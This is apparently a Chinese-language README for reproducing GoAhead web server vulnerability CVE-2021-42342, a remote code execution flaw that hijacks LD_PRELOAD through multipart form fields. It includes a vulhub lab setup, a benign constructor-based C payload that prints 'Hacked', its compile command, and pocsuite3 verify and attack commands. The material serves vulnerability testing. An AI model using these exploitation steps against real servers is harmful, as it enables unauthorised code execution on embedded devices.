# goahead_CVE-2021-42342

## 介绍
GoAhead是一个开源(商业许可)、简单、轻巧、功能强大、可以在多个平台运行的Web Server，多用于嵌入式系统、智能设备。其支持运行ASP、Javascript和标准的CGI程序。

这个漏洞是[CVE-2017-17562](https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562)漏洞补丁的绕过，攻击者可以利用该补丁没有考虑到的multipart表单控制目标服务器的环境变量，进而劫持`LD_PRELOAD`来执行任意代码。

## 漏洞类型

远程代码执行


## 漏洞影响版本
GoAhead web-server = 4.x、5.x <= GoAhead web-server < 5.1.5

## 漏洞利用条件
无需登录
## 风险程度
高危

## 漏洞环境搭建

[vulhub](https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2021-42342)

```shell
docker-compose up -d
```
## 验证payload

`payload.c`

```c
#include <unistd.h>

static void before_main(void) __attribute__((constructor));

static void before_main(void)
{
    write(1, "Hello: World\r\n\r\n", 16);
    write(1, "Hacked\n", 7);
}
```

```shell
# 编译
gcc -s -shared -fPIC ./payload.c -o CVE-2021-42342_payload.so
```

## exp 运行方式

`pocsuite3`

```shell
python cli.py -r pocs\goahead_CVE-2021-42342.py -u "http://10.10.50.4:8080/cgi-bin/index" --verify
python cli.py -r pocs\goahead_CVE-2021-42342.py -u "http://10.10.50.4:8080/cgi-bin/index" --attack
```
## 验证截图
![验证截图](./verify-01.png)